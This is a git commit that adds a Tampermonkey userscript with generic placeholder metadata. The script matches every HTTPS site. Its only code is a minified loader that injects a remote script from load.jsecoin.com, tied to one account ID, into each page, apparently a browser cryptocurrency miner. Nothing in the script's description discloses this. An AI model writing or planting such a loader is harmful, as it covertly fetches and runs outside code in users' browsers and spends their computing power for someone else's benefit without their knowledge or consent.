0c14507cfc131df7d9428adf3b8e5bb4d43ad2e1
SlayTheVirus <alexanderfrantom@gmail.com>
2019-09-11 10:13:17 -0400

    Add files via upload

---
+++ jse.user.js
@@ -0,0 +1,15 @@
+// ==UserScript==
+// @name         New Userscript
+// @namespace    http://tampermonkey.net/
+// @version      0.1
+// @description  try to take over the world!
+// @author       You
+// @match        https://*/*
+// @grant        none
+// ==/UserScript==
+
+(function() {
+    'use strict';
+
+!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/155806/allsites.com/optionalSubID/0/",s.parentNode.insertBefore(t,s)}();
+})();
